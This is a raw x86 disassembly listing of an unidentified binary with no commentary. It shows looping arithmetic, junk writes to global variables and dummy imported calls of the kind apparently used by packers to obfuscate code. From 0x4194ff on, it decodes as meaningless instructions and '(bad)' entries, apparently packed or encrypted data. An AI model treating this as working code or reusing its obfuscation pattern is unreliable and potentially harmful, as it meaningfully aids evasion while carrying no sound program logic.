  4190e7:	xor    edx,eax
  4190e9:	xor    ebx,eax
  4190eb:	sub    edx,ebx
  4190ed:	sub    edx,esi
  4190ef:	xor    edx,eax
  4190f1:	mov    DWORD PTR [ebp+0x8],edx
  4190f4:	mov    edx,DWORD PTR [ebp+0x8]
  4190f7:	mov    ebx,DWORD PTR [ebp-0x58]
  4190fa:	add    edx,0x5708e4
  419100:	imul   edx,ebx
  419103:	mov    DWORD PTR [ebp-0x58],edx
  419106:	mov    edx,DWORD PTR [ebp+0x8]
  419109:	mov    ebx,DWORD PTR [ebp-0x54]
  41910c:	add    edx,0x64f882
  419112:	or     edx,ebx
  419114:	mov    DWORD PTR [ebp-0x54],edx
  419117:	mov    edx,DWORD PTR [ebp+0x8]
  41911a:	mov    ebx,DWORD PTR [ebp-0x50]
  41911d:	add    edx,ecx
  41911f:	xor    edx,ebx
  419121:	mov    DWORD PTR [ebp-0x50],edx
  419124:	mov    edx,DWORD PTR [ebp+0x8]
  419127:	mov    ebx,DWORD PTR [ebp-0x4c]
  41912a:	add    edx,edi
  41912c:	and    edx,ebx
  41912e:	mov    DWORD PTR [ebp-0x4c],edx
  419131:	mov    edx,DWORD PTR [ebp+0x8]
  419134:	mov    ebx,DWORD PTR [ebp-0x48]
  419137:	lea    edx,[ebx+edx*1+0x241fcdf]
  41913e:	mov    DWORD PTR [ebp-0x48],edx
  419141:	mov    edx,DWORD PTR [ebp+0x8]
  419144:	mov    ebx,0xfa5e1522
  419149:	sub    ebx,edx
  41914b:	add    ebx,DWORD PTR [ebp-0x44]
  41914e:	mov    DWORD PTR [ebp-0x44],ebx
  419151:	mov    edx,DWORD PTR [ebp+0x8]
  419154:	xor    edx,eax
  419156:	add    edx,esi
  419158:	jne    0x4190e1
  41915e:	mov    edx,DWORD PTR [ebp-0x14]
  419161:	mov    DWORD PTR [ebp+0x8],edx
  419164:	jmp    0x4191d9
  419169:	mov    edx,DWORD PTR [ebp+0x8]
  41916c:	mov    ebx,DWORD PTR [ebp-0x8]
  41916f:	xor    edx,eax
  419171:	xor    ebx,eax
  419173:	sub    edx,ebx
  419175:	sub    edx,esi
  419177:	xor    edx,eax
  419179:	mov    DWORD PTR [ebp+0x8],edx
  41917c:	mov    edx,DWORD PTR [ebp+0x8]
  41917f:	mov    ebx,DWORD PTR [ebp-0x58]
  419182:	add    edx,0x5708e4
  419188:	imul   edx,ebx
  41918b:	mov    DWORD PTR [ebp-0x58],edx
  41918e:	mov    edx,DWORD PTR [ebp+0x8]
  419191:	mov    ebx,DWORD PTR [ebp-0x54]
  419194:	add    edx,0x64f882
  41919a:	or     edx,ebx
  41919c:	mov    DWORD PTR [ebp-0x54],edx
  41919f:	mov    edx,DWORD PTR [ebp+0x8]
  4191a2:	mov    ebx,DWORD PTR [ebp-0x50]
  4191a5:	add    edx,ecx
  4191a7:	xor    edx,ebx
  4191a9:	mov    DWORD PTR [ebp-0x50],edx
  4191ac:	mov    edx,DWORD PTR [ebp+0x8]
  4191af:	mov    ebx,DWORD PTR [ebp-0x4c]
  4191b2:	add    edx,edi
  4191b4:	and    edx,ebx
  4191b6:	mov    DWORD PTR [ebp-0x4c],edx
  4191b9:	mov    edx,DWORD PTR [ebp+0x8]
  4191bc:	mov    ebx,DWORD PTR [ebp-0x48]
  4191bf:	lea    edx,[ebx+edx*1+0x241fcdf]
  4191c6:	mov    DWORD PTR [ebp-0x48],edx
  4191c9:	mov    edx,DWORD PTR [ebp+0x8]
  4191cc:	mov    ebx,0xfa5e1522
  4191d1:	sub    ebx,edx
  4191d3:	add    ebx,DWORD PTR [ebp-0x44]
  4191d6:	mov    DWORD PTR [ebp-0x44],ebx
  4191d9:	mov    edx,DWORD PTR [ebp+0x8]
  4191dc:	xor    edx,eax
  4191de:	add    edx,esi
  4191e0:	jne    0x419169
  4191e6:	mov    edx,DWORD PTR [ebp-0x8]
  4191e9:	mov    ebx,DWORD PTR [ebp-0xc]
  4191ec:	xor    edx,eax
  4191ee:	lea    edx,[edx+ebx*1+0x3272f6]
  4191f5:	mov    DWORD PTR [ebp-0xc],edx
  4191f8:	mov    edx,DWORD PTR [ebp-0x10]
  4191fb:	xor    edx,eax
  4191fd:	add    edx,esi
  4191ff:	jne    0x416a2c
  419205:	jmp    0x41931c
  41920a:	mov    ecx,DWORD PTR [ebp-0x14]
  41920d:	mov    DWORD PTR [ebp+0x8],ecx
  419210:	jmp    0x419289
  419215:	mov    ecx,DWORD PTR [ebp+0x8]
  419218:	mov    edx,DWORD PTR [ebp-0x8]
  41921b:	xor    ecx,eax
  41921d:	xor    edx,eax
  41921f:	sub    ecx,edx
  419221:	sub    ecx,esi
  419223:	xor    ecx,eax
  419225:	mov    DWORD PTR [ebp+0x8],ecx
  419228:	mov    ecx,DWORD PTR [ebp+0x8]
  41922b:	mov    edx,DWORD PTR [ebp-0x58]
  41922e:	add    ecx,0x5708e4
  419234:	imul   ecx,edx
  419237:	mov    DWORD PTR [ebp-0x58],ecx
  41923a:	mov    ecx,DWORD PTR [ebp+0x8]
  41923d:	mov    edx,DWORD PTR [ebp-0x54]
  419240:	add    ecx,0x64f882
  419246:	or     ecx,edx
  419248:	mov    DWORD PTR [ebp-0x54],ecx
  41924b:	mov    ecx,DWORD PTR [ebp+0x8]
  41924e:	mov    edx,DWORD PTR [ebp-0x50]
  419251:	add    ecx,0x242ebf1
  419257:	xor    ecx,edx
  419259:	mov    DWORD PTR [ebp-0x50],ecx
  41925c:	mov    ecx,DWORD PTR [ebp+0x8]
  41925f:	mov    edx,DWORD PTR [ebp-0x4c]
  419262:	add    ecx,edi
  419264:	and    ecx,edx
  419266:	mov    DWORD PTR [ebp-0x4c],ecx
  419269:	mov    ecx,DWORD PTR [ebp+0x8]
  41926c:	mov    edx,DWORD PTR [ebp-0x48]
  41926f:	lea    ecx,[edx+ecx*1+0x241fcdf]
  419276:	mov    DWORD PTR [ebp-0x48],ecx
  419279:	mov    ecx,DWORD PTR [ebp+0x8]
  41927c:	mov    edx,0xfa5e1522
  419281:	sub    edx,ecx
  419283:	add    edx,DWORD PTR [ebp-0x44]
  419286:	mov    DWORD PTR [ebp-0x44],edx
  419289:	mov    ecx,DWORD PTR [ebp+0x8]
  41928c:	xor    ecx,eax
  41928e:	add    ecx,esi
  419290:	jne    0x419215
  419296:	jmp    0x419328
  41929b:	mov    ecx,DWORD PTR [ebp+0x8]
  41929e:	mov    edx,DWORD PTR [ebp-0x8]
  4192a1:	xor    ecx,eax
  4192a3:	xor    edx,eax
  4192a5:	sub    ecx,edx
  4192a7:	sub    ecx,esi
  4192a9:	xor    ecx,eax
  4192ab:	mov    DWORD PTR [ebp+0x8],ecx
  4192ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4192b1:	mov    edx,DWORD PTR [ebp-0x58]
  4192b4:	add    ecx,0x5708e4
  4192ba:	imul   ecx,edx
  4192bd:	mov    DWORD PTR [ebp-0x58],ecx
  4192c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4192c3:	mov    edx,DWORD PTR [ebp-0x54]
  4192c6:	add    ecx,0x64f882
  4192cc:	or     ecx,edx
  4192ce:	mov    DWORD PTR [ebp-0x54],ecx
  4192d1:	mov    ecx,DWORD PTR [ebp+0x8]
  4192d4:	mov    edx,DWORD PTR [ebp-0x50]
  4192d7:	add    ecx,0x242ebf1
  4192dd:	xor    ecx,edx
  4192df:	mov    DWORD PTR [ebp-0x50],ecx
  4192e2:	mov    ecx,DWORD PTR [ebp+0x8]
  4192e5:	mov    edx,DWORD PTR [ebp-0x4c]
  4192e8:	add    ecx,edi
  4192ea:	and    ecx,edx
  4192ec:	mov    DWORD PTR [ebp-0x4c],ecx
  4192ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4192f2:	mov    edx,DWORD PTR [ebp-0x48]
  4192f5:	lea    ecx,[edx+ecx*1+0x241fcdf]
  4192fc:	mov    DWORD PTR [ebp-0x48],ecx
  4192ff:	mov    ecx,DWORD PTR [ebp+0x8]
  419302:	mov    edx,0xfa5e1522
  419307:	sub    edx,ecx
  419309:	add    edx,DWORD PTR [ebp-0x44]
  41930c:	mov    DWORD PTR [ebp-0x44],edx
  41930f:	mov    ecx,DWORD PTR [ebp+0x8]
  419312:	xor    ecx,eax
  419314:	add    ecx,esi
  419316:	jne    0x41929b
  41931c:	mov    ecx,DWORD PTR [ebp-0x8]
  41931f:	xor    ecx,eax
  419321:	mov    eax,DWORD PTR [ebp+0x10]
  419324:	add    ecx,esi
  419326:	mov    DWORD PTR [eax],ecx
  419328:	pop    edi
  419329:	pop    esi
  41932a:	pop    ebx
  41932b:	leave  
  41932c:	ret    0xc
  41932f:	push   ebp
  419330:	mov    ebp,esp
  419332:	sub    esp,0x78
  419335:	and    DWORD PTR ds:0x428eaf,0x46d6
  41933f:	push   esi
  419340:	push   edi
  419341:	or     eax,DWORD PTR ds:0x428e37
  419347:	mov    eax,ds:0x428373
  41934c:	or     ecx,edi
  41934e:	mov    DWORD PTR [ebp-0x24],eax
  419351:	and    DWORD PTR ds:0x428eb3,0x0
  41935b:	jmp    0x41936b
  419360:	mov    eax,ds:0x428eb3
  419365:	inc    eax
  419366:	mov    ds:0x428eb3,eax
  41936b:	cmp    DWORD PTR ds:0x428eb3,0x15
  419372:	jae    0x41939a
  419378:	cmp    DWORD PTR ds:0x428eb3,0x21
  41937f:	ja     0x41939a
  419385:	jmp    0x419395
  41938a:	push   0x6ea1
  41938f:	call   DWORD PTR ds:0x42aa07
  419395:	jmp    0x419360
  41939a:	mov    eax,ds:0x428493
  41939f:	mov    DWORD PTR [ebp-0x30],eax
  4193a2:	mov    DWORD PTR [ebp-0x2c],0xf89c85a5
  4193a9:	sub    DWORD PTR ds:0x428e3f,edi
  4193af:	mov    DWORD PTR [ebp-0x28],0xf89c85a4
  4193b6:	mov    eax,DWORD PTR [ebp-0x10]
  4193b9:	mov    ecx,DWORD PTR [ebp-0x10]
  4193bc:	sub    eax,ecx
  4193be:	mov    DWORD PTR [ebp-0x10],eax
  4193c1:	and    DWORD PTR ds:0x428e93,edi
  4193c7:	xor    DWORD PTR [ebp-0x10],0xf89cb5a5
  4193ce:	adc    ecx,0x318b
  4193d4:	mov    eax,DWORD PTR [ebp-0x18]
  4193d7:	mov    ecx,DWORD PTR [ebp-0x18]
  4193da:	xor    DWORD PTR ds:0x428e8f,edi
  4193e0:	sub    eax,ecx
  4193e2:	mov    DWORD PTR [ebp-0x18],eax
  4193e5:	sbb    DWORD PTR ds:0x428e5b,ebx
  4193eb:	or     DWORD PTR [ebp-0x18],0xf89f05a5
  4193f2:	or     DWORD PTR ds:0x428e2f,ebx
  4193f8:	mov    eax,DWORD PTR [ebp-0xc]
  4193fb:	adc    DWORD PTR ds:0x428e47,ecx
  419401:	mov    ecx,DWORD PTR [ebp-0xc]
  419404:	sub    eax,ecx
  419406:	add    DWORD PTR ds:0x428e6f,edx
  41940c:	mov    DWORD PTR [ebp-0xc],eax
  41940f:	and    DWORD PTR ds:0x428eb7,ecx
  419415:	or     DWORD PTR [ebp-0xc],0xf89c85e5
  41941c:	add    DWORD PTR ds:0x428ec7,ebx
  419422:	mov    eax,DWORD PTR [ebp-0x1c]
  419425:	mov    ecx,DWORD PTR [ebp-0x1c]
  419428:	sub    eax,ecx
  41942a:	add    edi,0xa93
  419430:	mov    DWORD PTR [ebp-0x1c],eax
  419433:	or     DWORD PTR ds:0x428e87,0x297e
  41943d:	or     DWORD PTR [ebp-0x1c],0xf89c8585
  419444:	mov    eax,DWORD PTR [ebp-0x20]
  419447:	mov    DWORD PTR ds:0x428e9f,0x15
  419451:	cmp    DWORD PTR ds:0x428e9f,0x0
  419458:	je     0x4194a7
  41945e:	cmp    DWORD PTR ds:0x428e9f,0x5
  419465:	jb     0x4194a7
  41946b:	jmp    0x419479
  419470:	push   DWORD PTR [ebp-0x20]
  419473:	call   DWORD PTR ds:0x42aa0b
  419479:	cmp    DWORD PTR ds:0x428e9f,0x6
  419480:	jne    0x419495
  419486:	xor    edi,edi
  419488:	or     edi,DWORD PTR ds:0x428e9f
  41948e:	dec    edi
  41948f:	mov    DWORD PTR ds:0x428e9f,edi
  419495:	mov    edi,DWORD PTR ds:0x428e9f
  41949b:	dec    edi
  41949c:	mov    DWORD PTR ds:0x428e9f,edi
  4194a2:	jmp    0x419451
  4194a7:	mov    ecx,DWORD PTR [ebp-0x20]
  4194aa:	sub    DWORD PTR ds:0x428e73,0x4181
  4194b4:	sub    eax,ecx
  4194b6:	mov    DWORD PTR [ebp-0x20],eax
  4194b9:	neg    edi
  4194bb:	mov    eax,DWORD PTR [ebp-0x2c]
  4194be:	mov    ecx,DWORD PTR [ebp-0x20]
  4194c1:	mov    esi,0x75108af
  4194c6:	xor    eax,esi
  4194c8:	add    DWORD PTR ds:0x428e2f,0x596
  4194d2:	mov    edi,0x3272f6
  4194d7:	or     DWORD PTR ds:0x428e43,0x428e77
  4194e1:	add    eax,edi
  4194e3:	or     eax,ecx
  4194e5:	mov    DWORD PTR ds:0x428e43,0x54e0
  4194ef:	mov    DWORD PTR [ebp-0x20],eax
  4194f2:	add    eax,0x58c9
  4194f7:	mov    eax,DWORD PTR [ebp-0x4]
  4194fa:	jmp    0x41b84d
  4194ff:	imul   edx,DWORD PTR [edi],0x45054527
  419505:	or     DWORD PTR [edi],edx
  419507:	dec    esp
  419508:	xchg   ecx,eax
  419509:	in     al,0xff
  41950b:	and    BYTE PTR [eax-0x12],dh
  41950e:	sbb    bl,BYTE PTR [ebp+0x20]
  419511:	add    BYTE PTR [ebx-0x7c7c9fb3],0xcc
  419518:	push   ss
  419519:	inc    esi
  41951a:	sub    al,0x94
  41951c:	mul    DWORD PTR [eax]
  41951e:	gs mov esi,0x5e1c83f8
  419524:	mov    esp,0x8c1f1f73
  419529:	inc    edi
  41952a:	shl    edi,0xc1
  41952d:	and    BYTE PTR [esi+0x7b],cl
  419530:	mov    cl,0x3
  419532:	pop    ds
  419533:	in     al,dx
  419534:	std    
  419535:	cs daa 
  419537:	mov    bl,0x98
  419539:	and    BYTE PTR [ebp+0x21],dl
  41953c:	mov    ds:0xcb7f1c38,al
  419541:	mov    eax,0x8700cbe3
  419546:	jmp    0x3f8:0x9fed770d
  41954d:	inc    ecx
  41954e:	push   0xffffffb5
  419550:	and    BYTE PTR [ecx-0x1f35019c],dh
  419556:	mov    edx,0xb663d6ab
  41955b:	mov    dl,0x3
  41955d:	jb     0x4195cd
  41955f:	cmp    BYTE PTR [esi],ah
  419561:	loope  0x419572
  419563:	aas    
  419564:	pop    ebp
  419565:	mov    ecx,0x13ef066f
  41956a:	rcr    ecx,0x28
  41956d:	movups xmm5,XMMWORD PTR [edx-0x24]
  419571:	cmp    esi,DWORD PTR [edi-0x50]
  419574:	in     al,dx
  419575:	pop    edi
  419576:	add    al,0xab
  419578:	and    DWORD PTR [esi],esp
  41957a:	push   ebp
  41957b:	rol    al,1
  41957d:	jbe    0x419569
  41957f:	pop    eax
  419580:	mov    bh,dl
  419582:	addr16 jno 0x419581
  419585:	ss jns 0x419583
  419588:	bound  edx,QWORD PTR [edx+0x1f]
  41958b:	cmp    al,0x6f
  41958d:	mov    esp,0x7deaaf60
  419592:	fcomi  st,st(0)
  419594:	mov    edi,0xa863b19e
  419599:	jl     0x41957b
  41959b:	(bad)  
  41959d:	mov    eax,0x24c7ca1f
  4195a2:	inc    esi
  4195a3:	add    esp,ebx
  4195a5:	xor    DWORD PTR [edi+0xd],esi
  4195a8:	in     eax,dx
  4195a9:	adc    ah,BYTE PTR [ecx]
  4195ab:	test   ax,0x50ec
  4195af:	cmp    esp,ecx
  4195b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195b2:	and    DWORD PTR [eax+0x23],esi
  4195b5:	adc    dh,BYTE PTR [eax+0x20]
  4195b8:	js     0x419593
  4195ba:	jae    0x419560
  4195bc:	xor    DWORD PTR [eax+esi*2-0x593c96fa],ebp
  4195c3:	sahf   
  4195c4:	jmp    0x8b50dcad
  4195c9:	dec    edi
  4195ca:	int    0xc2
  4195cc:	iret   
  4195cd:	ror    al,cl
  4195cf:	mov    esp,0x1592372b
  4195d4:	jmp    0x3391:0xbfe44699
  4195db:	and    dh,BYTE PTR [ebx+0x367b1ed0]
  4195e1:	retf   0x5b82
  4195e4:	adc    esp,0xa2bf7698
  4195ea:	xor    esi,DWORD PTR ds:[ebp+0x14]
  4195ee:	adc    eax,DWORD PTR [ebp+0x2655b59c]
  4195f4:	lock arpl dx,dx
  4195f7:	ss jl  0x41959a
  4195fa:	je     0x41960d
  4195fc:	rol    DWORD PTR [esi],cl
  4195fe:	inc    ebp
  4195ff:	pop    es
  419600:	out    0x50,eax
  419602:	out    dx,al
  419603:	popf   
  419604:	std    
  419605:	fstp   TBYTE PTR [edi+0x515b7e9b]
  41960b:	push   edi
  41960c:	push   ebp
  41960d:	and    al,0x4e
  41960f:	xchg   ebp,eax
  419610:	mov    esp,0x5ac6733b
  419615:	xchg   edx,eax
  419616:	(bad)  
  419618:	mov    esi,DWORD PTR [ecx-0x4c]
  41961b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41961c:	aam    0xd3
  41961e:	ret    0x8385
  419621:	inc    esp
  419622:	adc    al,0xf9
  419624:	outs   dx,DWORD PTR ds:[esi]
  419625:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419626:	dec    eax
  419627:	(bad)  
  419628:	bound  eax,QWORD PTR [ecx]
  41962a:	in     eax,0x13
  41962c:	fsub   QWORD PTR [edi+0x5ae31143]
  419632:	push   ecx
  419633:	outs   dx,BYTE PTR ds:[esi]
  419634:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419635:	xor    al,0x9d
  419637:	push   ds
  419638:	mov    cs,WORD PTR [eax]
  41963a:	out    dx,eax
  41963b:	shl    BYTE PTR [eax+0x3cf8880d],cl
  419641:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  419643:	out    0x93,eax
  419645:	sahf   
  419646:	inc    ebx
  419647:	fsub   QWORD PTR [edi-0x6]
  41964a:	jp     0x4196b6
  41964c:	ja     0x419605
  41964e:	retf   0xff43
  419651:	pusha  
  419652:	push   ebx
  419653:	mov    cl,0x43
  419655:	(bad)  
  419656:	jle    0x419662
  419658:	jg     0x419614
  41965a:	lock mov ch,0xd3
  41965d:	int    0xea
  41965f:	push   es
  419660:	sub    bl,ah
  419662:	jbe    0x419606
  419664:	clc    
  419665:	mov    esp,fs
  419667:	and    BYTE PTR [ebx],ah
  419669:	add    ecx,DWORD PTR [esi+0x3c]
  41966c:	leave  
  41966d:	div    DWORD PTR [eax]
  41966f:	xlat   BYTE PTR ds:[ebx]
  419670:	pop    esp
  419671:	fdiv   DWORD PTR [eax-0x61]
  419674:	mov    esi,0xb2912b7
  419679:	add    eax,0xbb27b5ab
  41967e:	fisttp DWORD PTR [ecx]
  419680:	mov    edx,0x849f4c73
  419685:	pop    edx
  419686:	jne    0x419701
  419688:	neg    DWORD PTR [ebp+eax*2+0x1743b0c5]
  41968f:	loope  0x41969d
  419691:	shl    edi,1
  419693:	pop    ss
  419694:	sbb    DWORD PTR [ebp+0x4ddb32b3],edi
  41969a:	mov    ds:0x22c6b01d,al
  41969f:	(bad)  
  4196a0:	dec    BYTE PTR [esi+edi*4]
  4196a3:	mov    ch,0xbf
  4196a5:	(bad)  
  4196a6:	mov    al,0xaf
  4196a8:	sub    BYTE PTR [esi-0x2e],al
  4196ab:	aad    0x96
  4196ad:	not    BYTE PTR [esi-0x6a]
  4196b0:	xchg   ecx,eax
  4196b1:	dec    edi
  4196b2:	xchg   ebx,eax
  4196b3:	and    al,ah
  4196b5:	in     eax,0x71
  4196b7:	push   ss
  4196b8:	jmp    0xbf1ca48d
  4196bd:	jne    0x419691
  4196bf:	les    esi,FWORD PTR [edi-0x42]
  4196c2:	jae    0x419711
  4196c4:	cmp    eax,0xcab98238
  4196c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196ca:	mov    ch,BYTE PTR [ecx-0x2c7d62e7]
  4196d0:	in     al,0x2e
  4196d2:	test   cl,cl
  4196d4:	adc    eax,0xddccb303
  4196d9:	jle    0x419717
  4196db:	ds sahf 
  4196dd:	push   eax
  4196de:	push   ebp
  4196df:	xchg   DWORD PTR [edi+edx*1+0xa8c25d],ecx
  4196e6:	and    eax,0xc3a50f19
  4196eb:	into   
  4196ec:	mov    ss,WORD PTR [ecx+0x70]
  4196ef:	jne    0x4196d1
  4196f1:	sbb    al,0x0
  4196f3:	iret   
  4196f4:	icebp  
  4196f5:	push   ds
  4196f6:	test   al,0x0
  4196f8:	mov    dl,0x9d
  4196fa:	sbb    DWORD PTR [esi-0x64aae1a0],ecx
  419700:	push   ss
  419701:	sub    esp,edx
  419703:	adc    ah,BYTE PTR [ebx-0x56]
  419706:	andps  xmm2,xmm1
  419709:	and    al,0x9b
  41970b:	stos   BYTE PTR es:[edi],al
  41970c:	or     eax,0x961e4e45
  419711:	js     0x419695
  419713:	hlt    
  419714:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419715:	or     eax,0xeaa81e25
  41971a:	jmp    0x9876:0x4245e650
  419721:	inc    edi
  419722:	jmp    0x3cd0:0x8e428b8
  419729:	repz cmp esi,DWORD PTR [ebx+0xe2b7273]
  419730:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419731:	or     bl,al
  419733:	or     al,0x35
  419735:	mov    eax,ds:0xa823aeba
  41973a:	push   edi
  41973b:	mov    esp,0xba76a7e7
  419740:	sub    DWORD PTR [ecx+0x6cb59383],0x1f
  419747:	push   ecx
  419748:	jg     0x419781
  41974a:	test   al,0x7a
  41974c:	mov    esi,0x77cdb6a9
  419751:	push   0x71
  419753:	xchg   ebx,eax
  419754:	inc    cl
  419756:	mov    esi,0xa0fc6825
  41975b:	xchg   edi,eax
  41975c:	mov    gs,WORD PTR [edx+edi*8+0x244b45c5]
  419763:	adc    DWORD PTR [edx+0x5b14c3e],ecx
  419769:	mov    edi,esi
  41976b:	mov    edi,ebx
  41976d:	cmp    ebx,DWORD PTR [ecx]
  41976f:	push   edi
  419770:	ss addr16 dec ebx
  419773:	mov    ebp,0x7fca551
  419778:	mov    esi,0x9a865525
  41977d:	dec    ebp
  41977e:	sbb    eax,0x76ebb551
  419783:	ds adc al,0xb0
  419786:	mov    edi,0xc3ec175
  41978b:	push   eax
  41978c:	aam    0x2
  41978e:	dec    esi
  41978f:	sbb    BYTE PTR [ecx],al
  419791:	push   0xffffff9e
  419793:	enter  0xd2d5,0x51
  419797:	rcr    BYTE PTR [ecx+0x64ba881],1
  41979d:	inc    edi
  41979e:	pushf  
  41979f:	cmc    
  4197a0:	push   es
  4197a1:	ret    0x9443
  4197a4:	mov    bh,0x8
  4197a6:	mov    esi,0xf0d793d
  4197ab:	push   ds
  4197ac:	lea    esp,[ecx]
  4197ae:	addr16 mov ch,0x4
  4197b1:	xchg   esp,eax
  4197b2:	shl    DWORD PTR [edi+0x77],0xed
  4197b6:	mov    esi,0x9696b768
  4197bb:	imul   ebx,ebp,0x42f4a323
  4197c1:	pushf  
  4197c2:	aam    0x55
  4197c4:	xor    eax,DWORD PTR [eax-0xe]
  4197c7:	loop   0x4197cb
  4197c9:	retf   
  4197ca:	push   esi
  4197cb:	ins    DWORD PTR es:[edi],dx
  4197cc:	push   edi
  4197cd:	jne    0x41980f
  4197cf:	scas   eax,DWORD PTR es:[edi]
  4197d0:	fstp   TBYTE PTR [edi]
  4197d2:	dec    ebx
  4197d3:	outs   dx,BYTE PTR ds:[esi]
  4197d4:	jno    0x41980f
  4197d6:	clc    
  4197d7:	dec    edi
  4197d8:	ror    dh,0x0
  4197db:	aam    0x2f
  4197dd:	in     eax,dx
  4197de:	jle    0x41985a
  4197e0:	arpl   WORD PTR [ecx-0x1c],si
  4197e3:	inc    esp
  4197e4:	icebp  
  4197e5:	mov    ah,0xa9
  4197e7:	or     DWORD PTR [edx+0x3a],ebp
  4197ea:	pop    edi
  4197eb:	lock push ss
  4197ed:	popa   
  4197ee:	gs jle 0x419825
  4197f1:	pop    esi
  4197f2:	aas    
  4197f3:	imul   ebp,DWORD PTR [ebx],0x66
  4197f6:	xchg   edx,eax
  4197f7:	mov    bl,0x71
  4197f9:	and    ch,BYTE PTR [ecx]
  4197fb:	xchg   ebx,eax
  4197fc:	sbb    DWORD PTR [ecx+0x17501c3],ecx
  419802:	popf   
  419803:	pushf  
  419804:	sahf   
  419805:	lods   eax,DWORD PTR ds:[esi]
  419806:	cwde   
  419807:	lock gs cmc 
  41980a:	mov    DWORD PTR [edx],ebx
  41980c:	out    dx,eax
  41980d:	ins    DWORD PTR es:[edi],dx
  41980e:	lds    edx,FWORD PTR [ecx]
  419810:	sbb    edx,DWORD PTR [ebx+0x2f6ad8c4]
  419816:	dec    ecx
  419817:	mov    BYTE PTR ds:0x1efe33ec,bl
  41981d:	shl    DWORD PTR [ecx+ebx*1-0x10907f67],cl
  419824:	xor    DWORD PTR ds:0x5eefe317,ebp
  41982a:	and    al,0x46
  41982c:	sbb    DWORD PTR [ecx],0x658e71a1
  419832:	ins    DWORD PTR es:[edi],dx
  419833:	imul   edi,eax,0x5f28a304
  419839:	fcmovu st,st(0)
  41983b:	cdq    
  41983c:	mov    al,ds:0x13486a39
  419841:	mov    esp,0x49a0fb20
  419846:	stos   BYTE PTR es:[edi],al
  419847:	retf   
  419848:	popf   
  419849:	pushf  
  41984a:	sbb    BYTE PTR [edx+0x36],al
  41984d:	dec    ebp
  41984e:	xlat   BYTE PTR ds:[ebx]
  41984f:	sub    eax,0x20980846
  419854:	push   ecx
  419855:	sub    eax,0x92b1c9c1
  41985a:	mov    ds:0x7d70032d,al
  41985f:	les    ecx,FWORD PTR [ecx+0x1c]
  419862:	mov    ebx,0x923ee1da
  419867:	call   0x64e6:0xb06cfda2
  41986e:	jo     0x41983d
  419870:	ficomp DWORD PTR [esi-0x189717c9]
  419876:	adc    DWORD PTR [ebx],esi
  419878:	jbe    0x4198f2
  41987a:	retf   0xfee2
  41987d:	loopne 0x4198d5
  41987f:	jp     0x419845
  419881:	push   esi
  419882:	out    dx,al
  419883:	int    0x66
  419885:	pop    esi
  419887:	dec    edx
  419888:	mov    ah,0x7f
  41988a:	aas    
  41988b:	adc    al,0x4c
  41988d:	or     BYTE PTR [esi],cl
  41988f:	inc    ecx
  419890:	fs push ss
  419892:	xor    BYTE PTR [ecx],bh
  419894:	cli    
  419895:	pop    ds
  419896:	xor    ebx,DWORD PTR [ecx+0x61efb76a]
  41989c:	xchg   esp,eax
  41989d:	jle    0x419845
  41989f:	pop    esp
  4198a0:	mov    ah,0x64
  4198a2:	jmp    0x4198f3
  4198a4:	jne    0x419832
  4198a6:	lea    eax,[ecx+0x2d429a93]
  4198ac:	scas   al,BYTE PTR es:[edi]
  4198ad:	and    ah,ch
  4198af:	out    dx,eax
  4198b0:	pop    edx
  4198b1:	dec    eax
  4198b2:	mov    al,0x7b
  4198b4:	(bad)  
  4198b5:	es pop ss
  4198b7:	mov    al,ds:0xfad33786
  4198bc:	pop    esi
  4198bd:	outs   dx,BYTE PTR ds:[esi]
  4198be:	les    ebx,FWORD PTR [ebx-0x46584c99]
  4198c4:	xchg   di,ax
  4198c6:	xor    BYTE PTR [edi],dh
  4198c8:	fnstcw WORD PTR [ebx-0x40ba17f4]
  4198ce:	mov    ecx,0x820b1937
  4198d3:	push   ss
  4198d4:	dec    ecx
  4198d5:	shl    dl,1
  4198d7:	push   cs
  4198d8:	jnp    0x419897
  4198da:	out    0xf,al
  4198dc:	cli    
  4198dd:	out    dx,eax
  4198de:	pop    ebp
  4198df:	jge    0x419915
  4198e1:	call   0x737df018
  4198e6:	(bad)  [edx]
  4198e8:	xor    BYTE PTR [ebp-0x6ca68b78],dl
  4198ee:	int3   
  4198ef:	cwde   
  4198f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198f1:	outs   dx,BYTE PTR ds:[esi]
  4198f2:	int    0x5b
  4198f4:	and    eax,0x7c065c58
  4198f9:	sub    DWORD PTR [edi],0xc
  4198fc:	(bad)  
  4198fd:	xor    esi,eax
  4198ff:	mov    ah,BYTE PTR [eax+0x39]
  419902:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419903:	cdq    
  419904:	(bad)  
  419905:	xchg   ecx,eax
  419906:	mov    dh,0x7c
  419908:	(bad)  [edx-0x564a7bdf]
  41990e:	mov    esp,0x73999a0f
  419913:	add    BYTE PTR [ebp+ebp*8+0x48],al
  419917:	psadbw mm0,mm0
  41991a:	sbb    al,0x71
  41991c:	(bad)  
  41991d:	icebp  
  41991e:	xor    al,0x20
  419920:	xor    al,0x66
  419922:	call   0x5590:0x78393f41
  419929:	arpl   WORD PTR [edx+ebx*1+0x42],dx
  41992d:	xchg   ebx,eax
  41992e:	dec    bl
  419930:	out    dx,al
  419931:	jmp    0x419939
  419933:	(bad)  
  419934:	arpl   WORD PTR [edi],si
  419936:	frstor [edi+0x60]
  419939:	clc    
  41993a:	add    esi,DWORD PTR cs:[ebx-0x54]
  41993e:	out    dx,al
  41993f:	adc    esp,DWORD PTR [esi]
  419941:	mov    cl,0x98
  419943:	mov    ah,ah
  419945:	add    esp,DWORD PTR [ebp+eiz*4-0x298420b1]
  41994c:	mov    bh,0xad
  41994e:	mov    WORD PTR [esi-0x4e236b4f],?
  419954:	xchg   ebp,eax
  419955:	mov    eax,0xf40965e6
  41995a:	add    ah,dh
  41995c:	je     0x4199c0
  41995e:	fldenv [edi+0x1da4648b]
  419964:	int3   
  419965:	fmul   QWORD PTR [eax]
  419967:	dec    edi
  419968:	pop    es
